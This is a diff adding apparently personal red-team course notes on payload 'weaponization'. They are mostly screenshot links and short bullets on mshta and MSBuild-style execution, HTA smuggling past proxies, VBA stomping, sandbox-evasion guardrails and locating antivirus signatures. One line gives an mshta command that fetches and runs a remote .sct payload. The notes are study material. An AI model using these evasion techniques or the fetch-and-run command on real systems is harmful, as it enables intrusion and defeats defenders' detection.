@@ -1,0 +1,61 @@
+## Weaponization
+![[Pasted image 20260117211733.png]]
+![[Pasted image 20260117211824.png]]
+![[Pasted image 20260117212450.png]]![[Pasted image 20260117212936.png]]
+![[Pasted image 20260117213337.png]]![[Pasted image 20260117214027.png]]
+![[Pasted image 20260121210305.png]]
+- Inside windows tool that can be abused to execute js or visual basic script
+![[Pasted image 20260121210336.png]]
+mshta.exe javascript:a=GetObject("script:https://payload.me/Mshta_calc.sct").Exec();close();
+![[Pasted image 20260121211034.png]]
+![[Pasted image 20260121211253.png]]
+- A lot of times a proxy will not allow hta as it is because it common with attackers demiguise encrypts it to text html then decrypt in in the client page making it bypass the proxy
+- ![[Pasted image 20260121211546.png]]
+- VBA Stomping - VBA in a office document has two parts a source code and a compiled code thats runs when the user clicks enable content and opens the document.
+	when using malicious code it possible to compile the evil code and then change the source code so when analyzied the source code would be legit but his twin compiled brother which executed was evil...
+	evil clippy from github outflank can help u do that
+	- Downside - your office distro has to be the same as the target 
+![[Pasted image 20260121212523.png]]
+
+- preinstalled on windows 
+- compile xml files on the fiy 
+- can create a dropper that drops the xml file and compile it when it dropped so not needed to use a precompiled payload
+- ![[Pasted image 20260121212933.png]]
+- ![[Pasted image 20260121215056.png]]
+- not executed click /  cmd 
+- ![[Pasted image 20260121215152.png]]
+-  can be bypassed easily as its not for security properties (it to help admins not to execute wrongly in their local machine instead of remote machine )
+- ![[Pasted image 20260121215605.png]]
+- ![[Pasted image 20260121215823.png]]
+- can fetch & execute a .sct payloads as some c2 including empire supports but as u know its a risk its very noisy
+- ![[Pasted image 20260121221346.png]]
+- van run both 64 & 32 bits dll 
+- can run javascript can be used to fetch js from the internet 
+- ![[Pasted image 20260121221630.png]]
+- can making shortcut or changing an existing one to open both notepad and payload
+- the & symbl can chain commands {can be the ; and the instructor wrong} 
+- ![[Pasted image 20260121221806.png]]
+- ![[Pasted image 20260121222204.png]]
+- PDB file - debug symbol file u link it in and if u are not specify u to extract it u are gonna to send it with your compiled project and when reverse engineering reasearchers going to reverse your payload it gonna help them to understand your program as all the debug info their.
+- ![[Pasted image 20260122200842.png]]
+-  how to prevent our payload to be executed in a private systems ? 
+- Execution Guardrails - querying Win32API to fetch more info about the target 
+  is the system belonging to that ip range ?
+  is there is a file share available ? etc...
+  vm and sandbox check how many hard drive can u see virtualization software is there a keyboard attached ?
+  - monitor the keyboard and only execute the payload if the space bar executed at least 5 times  - trying to define the executer as human 
+  - ![[Pasted image 20260122201405.png]]
+  - ![[Pasted image 20260122201519.png]]
+  - meterpreter created - binary splitted to multiple smaller files using the msProvider and if your file clean it gonna move to the next part until detection if there is a detection it keeps to divide to smaller part till identify where the signature catches your binary and replace or change that part.
+  - ![[Pasted image 20260122201833.png]]
+  - ![[Pasted image 20260122201919.png]]
+  - Same backend Common Languege runtime so its easily to convert ps to c# and reverse 
+  - because c# more new AMSI didnt applyied to it in that time 
+  - AMSI הוא מנגנון אבטחה שמובנה ב-Windows ומאפשר ל-Antivirus (כמו Windows Defender) **לסרוק קוד PowerShell בזמן אמת לפני שהוא רץ**.
+  - ![[Pasted image 20260122202540.png]]
+  - SeatBelt - have a lot of auto enum enabled very common tools 
+  - ![[Pasted image 20260122221817.png]]
+  - SharpUp - Privildge Escalation Checker 
+  - ![[Pasted image 20260122202705.png]]
+- [[Delivery - part 14]]
+
